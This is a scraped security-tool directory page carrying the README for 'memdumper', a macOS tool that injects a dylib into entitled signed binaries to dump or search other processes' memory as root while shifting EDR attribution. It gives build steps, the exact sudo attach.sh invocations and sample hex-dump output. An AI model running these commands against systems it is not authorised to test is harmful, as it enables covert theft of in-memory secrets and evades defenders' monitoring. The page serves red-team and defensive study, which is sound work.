@@ -1,0 +1,214 @@
+---
+title: memdumper
+url: https://kitploit.com/en/tools/github/cenobyte-vincit/memdumper
+source: Kitploit
+date: 2026-08-19
+fetch_date: 2026-08-20T02:55:11.053103
+---
+
+# memdumper
+
+[Skip to content](#main-content)
+
+[![Kitploit](/_next/image?url=%2Flogo.png&w=64&q=75)KITPLOIT](/en)[Tools](/en/tools)[Blog](/en/blog)Categories
+
+EN
+
+[Submit](/en/submit)
+
+[Tools](/en/tools)[Blog](/en/blog)Categories
+
+[Submit](/en/submit)
+
+EN
+
+Hacking, PenTest, and Cybersecurity Tools for Your Security Arsenal!
+
+Kitploit is a directory of hacking, cybersecurity, and pentesting tools. Discover the latest project updates to find vulnerabilities, analyze systems, automate testing, and strengthen your security.
+
+·Analytics preferences·[Feeds](/en/feeds)·[Contact](/en/contact)·[Privacy](/en/privacy)·© 2026 Kitploit
+
+Tool Directory
+
+## Categories
+
+[View all categories](/en/categories)
+
+Loading categories
+
+memdumper — Abuses macOS debugger entitlements and DYLD\_INSERT\_LIBRARIES to dump or search a running process's memory while shifting EDR attribution to a signed helper binary. | Kitploit
+
+[Tools](/en/tools)/![GitHub](/providers/github.png)GitHub/cenobyte-vincit/memdumper
+
+![](/_next/image?url=https%3A%2F%2Fassets.kitploit.com%2Fproduction%2Fpublic%2Ftools%2F50500%2F9e9cf09339a114ad7235dd6ed6517d8800ef855a87c3c51e456d87db36119b2f.png&w=3840&q=75)
+
+[Memory Forensics](/en/categories/memory-forensics)[IDS/IPS Evasion](/en/categories/ids-ips-evasion)[Information Gathering](/en/categories/information-gathering)[Post-Exploitation](/en/categories/post-exploitation)[Digital Forensics](/en/categories/digital-forensics)[Penetration Testing](/en/categories/penetration-testing)[Red Teaming](/en/categories/red-teaming)
+
+![GitHub](/providers/github.png)cenobyte-vincit/memdumper
+
+# memdumper
+
+Abuses macOS debugger entitlements and DYLD\_INSERT\_LIBRARIES to dump or search a running process's memory while shifting EDR attribution to a signed helper binary.
+
+[View Repository](https://github.com/cenobyte-vincit/memdumper)
+
+181 day ago![Not yet reviewed](/_next/image?url=%2Fbadges%2Fkitploit_badge_not_reviewed_full.png&w=48&q=75)
+
+### Most Popular
+
+[View all →](/en/tools)
+
+Discover the most used tools by our community.
+
+Last 7 DaysLast 30 Days
+
+Explore all tools
+
+Browse our collection of tools
+
+[View all tools →](/en/tools)
+
+Share
+
+# memdumper
+
+memdumper reads the memory of a running macOS process under another signed binary's debugger entitlement. The aim is that `task_for_pid` and `ptrace` run as that entitled binary, so an EDR records it rather than memdumper.
+
+by cenobyte [[email protected]](/cdn-cgi/l/email-protection#b2c4dbdcd1dbc6d3dfddc0c2d3c6c0dbd3d7f2d5dfd3dbde9cd1dddf) 2026
+
+<https://github.com/cenobyte-vincit/memdumper>
+
+## Summary
+
+memdumper starts an entitled binary carrying `com.apple.security.cs.debugger` plus the two entitlements that allow a `DYLD_INSERT_LIBRARIES` insert. Use it to search and dump the memory of another process as root. OpenJDK's `jspawnhelper` is a commonly found binary, especially on developer machines.
+
+Give `attach.sh` a target PID and the entitled binary. The dylib constructor runs before that binary's `main`, reads the target, then `_exit`s. The entitled binary never reaches `main`, so a helper such as `jspawnhelper` does not print its usage banner. Extra arguments after the entitled binary stay on the command line an EDR records. Without `-s` the dylib hex-dumps the start of each readable region. With `-s` it searches those regions for the string. The target address space is not written. `ptrace` attach can stop the target briefly.
+
+Dump status is the `[RESULT]` line on the merged output. A successful insert exits 0 after the constructor finishes.
+
+## Requirements
+
+### Runtime host
+
+* macOS (Darwin)
+* root
+* An entitled binary with all three of `com.apple.security.cs.debugger`, `com.apple.security.cs.allow-dyld-environment-variables`, and `com.apple.security.cs.disable-library-validation` (for example OpenJDK's `jspawnhelper`)
+
+### Build host
+
+* macOS (Darwin) with Xcode Command Line Tools or Xcode
+* `clang`
+* `make`
+* **shellcheck** for `attach.sh` and the test scripts (`brew install shellcheck`)
+* **cppcheck** (`brew install cppcheck`)
+
+## Build
+
+On the build host:
+
+root@kitploit:~
+
+```
+make
+```
+
+That produces `memdumper.dylib`. Copy `attach.sh` and `memdumper.dylib` onto the target if the machines are not the same.
+
+## Usage
+
+Run `attach.sh` as root from the directory that contains `memdumper.dylib`. A non-root caller is refused before the entitled binary starts (`root required`). That avoids the Developer Tool Access password dialog (`taskgated` / Authorization Services). That dialog is not Transparency, Consent, and Control (TCC).
+
+root@kitploit:~
+
+```
+sudo ./attach.sh [options] -p <pid> <entitled-binary> [args...]
+```
+
+Confirm a candidate entitled binary has the three entitlements. The Cellar prefix and OpenJDK version vary; `attach.sh` uses this layout in its own help:
+
+root@kitploit:~
+
+```
+codesign -d --entitlements - \
+	/opt/homebrew/Cellar/openjdk/25.0.2/libexec/openjdk.jdk/Contents/Home/lib/jspawnhelper
+```
+
+Dump readable regions of PID 4543:
+
+root@kitploit:~
+
+```
+sudo ./attach.sh -p 4543 \
+	/opt/homebrew/Cellar/openjdk/25.0.2/libexec/openjdk.jdk/Contents/Home/lib/jspawnhelper
+```
+
+Search that process for `HELLO`:
+
+root@kitploit:~
+
+```
+sudo ./attach.sh -s HELLO -p 4543 \
+	/opt/homebrew/Cellar/openjdk/25.0.2/libexec/openjdk.jdk/Contents/Home/lib/jspawnhelper
+```
+
+Cap the dump at 50 readable regions, using `java` as the entitled binary. `TestSpawn` stays on the command line; `java`'s `main` does not run:
+
+root@kitploit:~
+
+```
+sudo ./attach.sh -n 50 -p 4543 \
+	/opt/homebrew/Cellar/openjdk/25.0.2/bin/java TestSpawn
+```
+
+An editor without Hardened Runtime is a working smoke target. Start it as the user who owns the buffer, then attach as root. In one terminal:
+
+root@kitploit:~
+
+```
+nano foo
+```
+
+Put `HELLO` in the buffer so the string is in the process (write the file or leave it unsaved). In another terminal, from the directory that holds `memdumper.dylib`:
+
+root@kitploit:~
+
+```
+sudo ./attach.sh -s HELLO -p "$(pgrep nano)" \
+	/opt/homebrew/Cellar/openjdk/25.0.2/libexec/openjdk.jdk/Contents/Home/lib/jspawnhelper
+```
+
+A hit looks like this. The process then exits 0:
+
+root@kitploit:~
+
+```
+Target: pid 9810 (nano)
+Target has no hardened runtime
+
+[MEMDUMPER] Injected into PID 9852 (UID 0)
+[MEMDUMPER] Entitled binary: /opt/homebrew/Cellar/openjdk/25.0.2/libexec/openjdk.jdk/Contents/Home/lib/jspawnhelper
+[MEMDUMPER] Target: PID 9810 (nano)
+[METHOD1] task_for_pid() on PID 9810 (nano)
+[*] Got task port 0x1013
+[*] Task info: virt=425098.0MB res=8.3MB
+[*] Threads: 1
+[MEMORY SEARCH] Looking for "HELLO" in PID 9810
+MATCH at 0xa70c60200 (region: 0xa70c00000-0xa71000000, prot: rw-)
+Context:
+0x0000000a70c601c0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0x0000000a70c601d0: 4f 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |O...............|
+0x0000000a70c601e0: 23 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |#...............|
+0x0000000a70c601f0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0x0000000a70c60200: 48 45 4c 4c 4f 00 00 00  00 00 00 00 00 00 00 00  |HELLO...........|
+0x0000000a70c60210: 66 6f 6f 00 00 00 00 00  00 00 00 00 00 00 00 00  |foo.............|
+0x0000000a70c60220: 6f d9 b9 83 27 dc 6a ec  00 04 00 00 00 00 00 00  |o...'.j.........|
+0x0000000a70c60230: 48 45 4c 4c 4f 00 00 00  00 00 00 00 00 00 00 00  |HELLO...........|
+0x0000000a70c60240: 2e 2f 00 00 00                                    |./...|
+MATCH at 0xa70c60230 (region: 0xa70c00000-0xa71000000, prot: rw-)
+Context:
+0x0000000a70c601f0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0x0000000a70c60200: 48 45 4c 4c 4f 00 00 00  00 00 00 00 00 00 00 00  |HELLO...........|
+0x0000000a70c60210: 66 6f 6f 00 00 00 00 00  00 00 00 00 00 00 00 00  |foo.............|
+0x0000000a70c60220: 6f d9 b9 83 27 dc 6a ec  00 04 00 00 00 00 00 00  |o...'.j.........|
+0x0000000a70c60230: 48 45 4c 4c 4f 00 00 00  00 00 00 00 00 00 00 00  |HELLO...........|
+0x0000000a70c60240: 2e 2f 00 00 00 00 00 00  00 00 00 00 00 00 0...
